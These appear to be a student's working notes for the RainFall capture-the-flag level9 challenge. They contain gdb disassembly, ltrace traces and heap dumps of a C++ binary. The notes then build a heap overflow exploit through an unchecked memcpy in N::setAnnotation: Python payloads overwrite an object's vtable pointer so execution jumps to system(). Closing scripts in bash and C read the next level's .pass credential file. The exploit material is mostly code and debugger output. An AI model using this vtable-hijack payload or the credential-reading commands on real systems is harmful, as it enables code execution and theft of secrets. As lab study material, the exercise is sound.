Dump of assembler code for function _Znwj:								=	operator new ()
   0xb7f9b600 <+0>:     push   %edi
   0xb7f9b601 <+1>:     mov    $0x1,%eax
   0xb7f9b606 <+6>:     push   %esi
   0xb7f9b607 <+7>:     push   %ebx
   0xb7f9b608 <+8>:     sub    $0x10,%esp
   0xb7f9b60b <+11>:    mov    0x20(%esp),%esi
   0xb7f9b60f <+15>:    call   0xb7f364e7
   0xb7f9b614 <+20>:    add    $0x319e0,%ebx
   0xb7f9b61a <+26>:    test   %esi,%esi
   0xb7f9b61c <+28>:    cmove  %eax,%esi
   0xb7f9b61f <+31>:    mov    %esi,(%esp)
   0xb7f9b622 <+34>:    call   0xb7f34f60 <malloc@plt>			; call malloc				; cant break 1: not same stack memory ?
   0xb7f9b627 <+39>:    test   %eax,%eax
   0xb7f9b629 <+41>:    jne    0xb7f9b680 <_Znwj+128>
   0xb7f9b62b <+43>:    mov    -0x264(%ebx),%edi
   0xb7f9b631 <+49>:    mov    (%edi),%eax
   0xb7f9b633 <+51>:    test   %eax,%eax
   0xb7f9b635 <+53>:    je     0xb7f9b64c <_Znwj+76>
   0xb7f9b637 <+55>:    nop
   0xb7f9b638 <+56>:    call   *%eax
   0xb7f9b63a <+58>:    mov    %esi,(%esp)
   0xb7f9b63d <+61>:    call   0xb7f34f60 <malloc@plt>			; call malloc				; cant break 2
   0xb7f9b642 <+66>:    test   %eax,%eax
   0xb7f9b644 <+68>:    jne    0xb7f9b680 <_Znwj+128>
   0xb7f9b646 <+70>:    mov    (%edi),%eax
   0xb7f9b648 <+72>:    test   %eax,%eax
   0xb7f9b64a <+74>:    jne    0xb7f9b638 <_Znwj+56>
   0xb7f9b64c <+76>:    movl   $0x4,(%esp)
   0xb7f9b653 <+83>:    call   0xb7f34410 <__cxa_allocate_exception@plt>
   0xb7f9b658 <+88>:    mov    -0x320(%ebx),%edx
   0xb7f9b65e <+94>:    add    $0x8,%edx
   0xb7f9b661 <+97>:    mov    %edx,(%eax)
   0xb7f9b663 <+99>:    mov    -0x9c(%ebx),%edx
   0xb7f9b669 <+105>:   mov    %eax,(%esp)
   0xb7f9b66c <+108>:   mov    %edx,0x8(%esp)
   0xb7f9b670 <+112>:   mov    -0x4b4(%ebx),%edx
   0xb7f9b676 <+118>:   mov    %edx,0x4(%esp)
   0xb7f9b67a <+122>:   call   0xb7f348c0 <__cxa_throw@plt>
   0xb7f9b67f <+127>:   nop
   0xb7f9b680 <+128>:   add    $0x10,%esp
   0xb7f9b683 <+131>:   pop    %ebx
   0xb7f9b684 <+132>:   pop    %esi
   0xb7f9b685 <+133>:   pop    %edi
   0xb7f9b686 <+134>:   ret
   0xb7f9b687 <+135>:   cmp    $0xffffffff,%edx
   0xb7f9b68a <+138>:   mov    %eax,(%esp)
   0xb7f9b68d <+141>:   je     0xb7f9b694 <_Znwj+148>
   0xb7f9b68f <+143>:   call   0xb7f359d0 <_Unwind_Resume@plt>
   0xb7f9b694 <+148>:   call   0xb7f340e0 <__cxa_call_unexpected@plt>

Dump of assembler code for function _ZN1NC2Ei:							=	N::N(int)
   0x080486f6 <+0>:     push   %ebp
   0x080486f7 <+1>:     mov    %esp,%ebp
   0x080486f9 <+3>:     mov    0x8(%ebp),%eax
   0x080486fc <+6>:     movl   $0x8048848,(%eax)											; break 1
   0x08048702 <+12>:    mov    0x8(%ebp),%eax
   0x08048705 <+15>:    mov    0xc(%ebp),%edx
   0x08048708 <+18>:    mov    %edx,0x68(%eax)
   0x0804870b <+21>:    pop    %ebp
   0x0804870c <+22>:    ret

Dump of assembler code for function _ZN1N13setAnnotationEPc:			=	N::setAnnotation(char*) ()
   0x0804870e <+0>:     push   %ebp
   0x0804870f <+1>:     mov    %esp,%ebp
   0x08048711 <+3>:     sub    $0x18,%esp
   0x08048714 <+6>:     mov    0xc(%ebp),%eax
   0x08048717 <+9>:     mov    %eax,(%esp)
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>										; break 2
   0x0804871f <+17>:    mov    0x8(%ebp),%edx
   0x08048722 <+20>:    add    $0x4,%edx
   0x08048725 <+23>:    mov    %eax,0x8(%esp)
   0x08048729 <+27>:    mov    0xc(%ebp),%eax
   0x0804872c <+30>:    mov    %eax,0x4(%esp)
   0x08048730 <+34>:    mov    %edx,(%esp)
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>										; break 3
   0x08048738 <+42>:    leave
   0x08048739 <+43>:    ret

Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp					; 32
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>		; call _exit
   0x08048610 <+28>:    movl   $0x6c,(%esp)					; 108
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>		; call _Znwj	operator new ()
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>		; call _ZN1NC2Ei	N::N(int)
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)				; 28
   0x08048632 <+62>:    movl   $0x6c,(%esp)					; 108
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>		; call _Znwj	operator new ()
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>		; call _ZN1NC2Ei	N::N(int)
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax				; 28
   0x08048658 <+100>:   mov    %eax,0x14(%esp)				; 20
   0x0804865c <+104>:   mov    0x18(%esp),%eax				; 24
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax				; 12
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax				; 20
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>		; call _ZN1N13setAnnotationEPc	N::setAnnotation(char*) ()
   0x0804867c <+136>:   mov    0x10(%esp),%eax				; 16
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax				; 20
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax				; 16
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx						; call _ZN1NplERS_	N::operator+(N&) ()
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret


=================================================================================================================

memcpy(0x0804a00c, "AAAABBBBCCCCDDDD", 16)                 = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11) +++

level9@RainFall:~$ ltrace ./level9 1
__libc_start_main(0x80485f4, 2, 0xbffff7e4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)              = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                           = 0
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                      = 0x804a008
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                               = 0x804a078
strlen("1")                                                                                     = 1
memcpy(0x0804a00c, "1", 1)                                                                      = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                         = 0xb7fce4a0
+++ exited (status 11) +++

level9@RainFall:~$ ltrace ./level9 ""
__libc_start_main(0x80485f4, 2, 0xbffff7e4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)              = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                           = 0
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                      = 0x804a008
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                                               = 0x804a078
strlen("")                                                                                      = 0
memcpy(0x0804a00c, "", 0)                                                                       = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                         = 0xb7fce4a0
+++ exited (status 11) +++

(gdb) info proc map
	0x804a000  0x806b000    0x21000        0x0 [heap]
(gdb) x/64x 0x804a00c
	0x804a00c:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
	0x804a014:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
	0x804a01c:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
	0x804a024:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
	0x804a02c:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
	0x804a034:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
	0x804a03c:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
	0x804a044:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00


0x47       = 71
0x4247     = 16967
0x424247   = 4342343
0x42424247 = 1111638599

0x804a000:	1er new() 108 size
	0x804a008:      0x48    0x88    0x04    0x08
		Dump of assembler code for function _ZN1NC2Ei:							=	N::N(int)
		0x080486fc <+6>:     movl   $0x8048848,(%eax)

	VTABLE: (gdb) x/64x 0x8048840
		0x8048840 <_ZTV1N>:     0x00    0x00    0x00    0x00    0x54    0x88    0x04    0x08
		0x8048848 <_ZTV1N+8>:   0x3a    0x87    0x04    0x08    0x4e    0x87    0x04    0x08
		0x8048850 <_ZTS1N>:     0x31    0x4e    0x00    0x00    0x88    0x9b    0x04    0x08
		0x8048858 <_ZTI1N+4>:   0x50    0x88    0x04    0x08    0x01    0x1b    0x03    0x3b
			!0x00000000 <0x08048854
			0x0804873a 0x0804874e
			!0x00004e31 0x08049b88
			<0x08048850 !0x3b031b01
	VTABLE FUNC {
		(gdb) x/15i 0x0804873a
			0x804873a <_ZN1NplERS_>:     push   %ebp
			0x804873b <_ZN1NplERS_+1>:   mov    %esp,%ebp
			0x804873d <_ZN1NplERS_+3>:   mov    0x8(%ebp),%eax
			0x8048740 <_ZN1NplERS_+6>:   mov    0x68(%eax),%edx
			0x8048743 <_ZN1NplERS_+9>:   mov    0xc(%ebp),%eax
			0x8048746 <_ZN1NplERS_+12>:  mov    0x68(%eax),%eax
			0x8048749 <_ZN1NplERS_+15>:  add    %edx,%eax
			0x804874b <_ZN1NplERS_+17>:  pop    %ebp
			0x804874c <_ZN1NplERS_+18>:  ret
		(gdb) x/15i 0x0804874e
			0x804874e <_ZN1NmiERS_>:     push   %ebp
			0x804874f <_ZN1NmiERS_+1>:   mov    %esp,%ebp
			0x8048751 <_ZN1NmiERS_+3>:   mov    0x8(%ebp),%eax
			0x8048754 <_ZN1NmiERS_+6>:   mov    0x68(%eax),%edx
			0x8048757 <_ZN1NmiERS_+9>:   mov    0xc(%ebp),%eax
			0x804875a <_ZN1NmiERS_+12>:  mov    0x68(%eax),%eax
			0x804875d <_ZN1NmiERS_+15>:  mov    %edx,%ecx
			0x804875f <_ZN1NmiERS_+17>:  sub    %eax,%ecx
			0x8048761 <_ZN1NmiERS_+19>:  mov    %ecx,%eax
			0x8048763 <_ZN1NmiERS_+21>:  pop    %ebp
			0x8048764 <_ZN1NmiERS_+22>:  ret
		(gdb) x/40i 0x08049b80
			0x8049b80 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3>:       add    %al,(%eax)
			0x8049b82 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+2>:     add    %al,(%eax)
			0x8049b84 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+4>:     test   %al,%dl
			0x8049b86 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+6>:     cld
			0x8049b87 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+7>:     mov    $0xc0,%bh
			0x8049b89 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+9>:     xchg   %eax,%edx
			0x8049b8a <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+10>:    stc
			0x8049b8b <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+11>:    mov    $0xf0,%bh
			0x8049b8d <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+13>:    xchg   %eax,%edx
			0x8049b8e <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+14>:    stc
			0x8049b8f <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+15>:    mov    $0xc0,%bh
			0x8049b91 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+17>:    mov    $0xbed0b7f9,%esi
			0x8049b96 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+22>:    stc
			0x8049b97 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+23>:    mov    $0xb0,%bh
			0x8049b99 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+25>:    xchg   %eax,%ebx
			0x8049b9a <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+26>:    stc
			0x8049b9b <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+27>:    mov    $0x30,%bh
			0x8049b9d <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+29>:    xchg   %eax,%edx
			0x8049b9e <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+30>:    stc
			0x8049b9f <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+31>:    mov    $0x30,%bh
			0x8049ba1 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+33>:    xchg   %eax,%ebx
			0x8049ba2 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+34>:    stc
			0x8049ba3 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+35>:    mov    $0x40,%bh
			0x8049ba5 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+37>:    xchg   %eax,%esp
			0x8049ba6 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+38>:    stc
			0x8049ba7 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+39>:    mov    $0xa0,%bh
			0x8049ba9 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+41>:    xchg   %eax,%edx
			0x8049baa <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+42>:    stc
			0x8049bab <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+43>:    mov    $0x0,%bh
	}
	0x0804a00c: zone memoire dest de memcpy pour N::setAnnotation(char*)
		memcpy(0x0804a00c, "", 0)

		

0x804a070:	2eme new()
	0x804a078:      0x48    0x88    0x04    0x08   
	Pareil que le 1er


====================================================================================================
(gdb) x system
0xb7d86060

./level9 `python -c 'print "A"*X + "\x60\x60\xd8\xb7"'`

X	| stderr > error code
------------------------------------------------------
94  | > 11			SIGSEGV
95  | > 11				"
96  | > 11				"
97  | > 189			\xb7 + 6
98  | > 222			\xd8 + 6
99  | > 102			\x60 + 6
100 | > 102			\x60 + 6
101 | > 71			\x41 + 6
102 | > 71				"
103 | > 71				"
104 | > 71				"
105 | 10763 Segmentation fault (core dumped) > 139
106 | 10766 Segmentation fault (core dumped) > 139
110 | 10778 Segmentation fault (core dumped) > 139
====================================================================================================
(gdb) r `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08"'`
    Starting program: /home/user/level9/level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "/bin/sh"'`

    Breakpoint 4, 0x08048693 in main ()
(gdb) x/128x 0x804a000
    0x804a000:      0x00    0x00    0x00    0x00    0x71    0x00    0x00    0x00
    0x804a008:      0x48    0x88    0x04    0x08    0x60    0x60    0xd8    0xb7
    ;      override content is this memory location ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    0x804a010:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a018:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a020:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a028:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a030:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a038:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a040:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a048:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a050:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a058:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a060:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a068:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a070:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
    0x804a078:      0x0c    0xa0    0x04    0x08    0x2f    0x62    0x69    0x6e
    ; override here ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
(gdb) stepi
    0xb7d86060 in system () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
    Continuing.
    sh: 1:
       /bin/sh: not found
    [Inferior 1 (process 3580) exited normally]

#!/bin/bash

whoami >> /tmp/level9
cat /home/user/bonus0/.pass >> /tmp/level9

#include <stdio.h>
#include <stdlib.h>

int	main(void)
{
	system("whoami ; cat /home/user/bonus0/.pass");
	return (0);
}